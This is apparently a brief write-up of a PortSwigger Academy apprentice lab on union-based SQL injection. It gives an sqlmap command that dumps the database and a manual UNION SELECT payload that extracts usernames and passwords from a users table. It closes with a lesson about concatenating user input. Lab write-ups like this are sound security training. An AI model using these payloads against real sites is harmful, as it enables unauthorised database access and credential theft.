**Date:** 2024-11-07  
**Platform:** PortSwigger Academy  
**Difficulty:** Apprentice  
**Vulnerability:** SQL Injection (Union-Based)

## Key Steps
1. Identified vulnerable category filter parameter.
2. Used sqlmap to automate exploitation: `sqlmap -u "https://target/filter?category=Gifts" --dump`
3. Extracted credentials from a non-default `users_uiyknd` table.

## Payload
Automated via sqlmap. Manual approach would involve:
```sql
' UNION SELECT username_iphhrr, password_citoob FROM users_uiyknd--

## Lesson Learned
Never trust user input in database queries. The backend concatenated input directly into a PostgreSQL query without sanitization, allowing full database compromise.